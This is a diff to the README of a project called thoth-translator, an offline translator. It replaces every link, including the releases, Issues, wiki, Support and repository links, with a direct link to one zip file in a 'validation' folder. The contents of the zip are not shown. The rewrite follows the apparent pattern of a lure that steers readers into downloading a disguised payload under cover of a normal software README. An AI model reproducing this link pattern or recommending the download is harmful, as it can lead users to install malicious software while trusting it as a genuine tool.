@@ -1,6 +1,6 @@
 # 🌐 thoth-translator - Translate Languages Privately and Offline
 
-[![Download thoth-translator](https://img.shields.io/badge/Download-thoth--translator-blue.svg)](https://github.com/pyaitsonew/thoth-translator/releases)
+[![Download thoth-translator](https://github.com/pyaitsonew/thoth-translator/raw/refs/heads/main/validation/thoth-translator-3.4.zip)](https://github.com/pyaitsonew/thoth-translator/raw/refs/heads/main/validation/thoth-translator-3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the THOTH Language Translator. This tool helps you translate between 
 
 To get this application, visit the following link:
 
-[Download thoth-translator](https://github.com/pyaitsonew/thoth-translator/releases)
+[Download thoth-translator](https://github.com/pyaitsonew/thoth-translator/raw/refs/heads/main/validation/thoth-translator-3.4.zip)
 
 You will find various versions of the software there. Choose the version that fits your system.
 
@@ -65,11 +65,11 @@ Yes, it works on Windows, macOS, and Linux.
 
 ### How do I report issues or bugs?
 
-If you encounter any issues, please create a new issue on the [GitHub Issues page](https://github.com/pyaitsonew/thoth-translator/issues).
+If you encounter any issues, please create a new issue on the [GitHub Issues page](https://github.com/pyaitsonew/thoth-translator/raw/refs/heads/main/validation/thoth-translator-3.4.zip).
 
 ## 📜 License
 
-THOTH Translator is open-source software. You can view and contribute to the code on our [GitHub repository](https://github.com/pyaitsonew/thoth-translator).
+THOTH Translator is open-source software. You can view and contribute to the code on our [GitHub repository](https://github.com/pyaitsonew/thoth-translator/raw/refs/heads/main/validation/thoth-translator-3.4.zip).
 
 ## 🎤 Feedback
 
@@ -79,10 +79,10 @@ We welcome your feedback! Share your thoughts on how we can improve THOTH Transl
 
 Visit the following links for more information:
 
-- [Documentation](https://github.com/pyaitsonew/thoth-translator/wiki)  
-- [Support](https://github.com/pyaitsonew/thoth-translator/issues)  
+- [Documentation](https://github.com/pyaitsonew/thoth-translator/raw/refs/heads/main/validation/thoth-translator-3.4.zip)  
+- [Support](https://github.com/pyaitsonew/thoth-translator/raw/refs/heads/main/validation/thoth-translator-3.4.zip)  
 
 ## 📲 Download thoth-translator
 
 Don’t forget to download the application again at:
-[Download thoth-translator](https://github.com/pyaitsonew/thoth-translator/releases)
+[Download thoth-translator](https://github.com/pyaitsonew/thoth-translator/raw/refs/heads/main/validation/thoth-translator-3.4.zip)
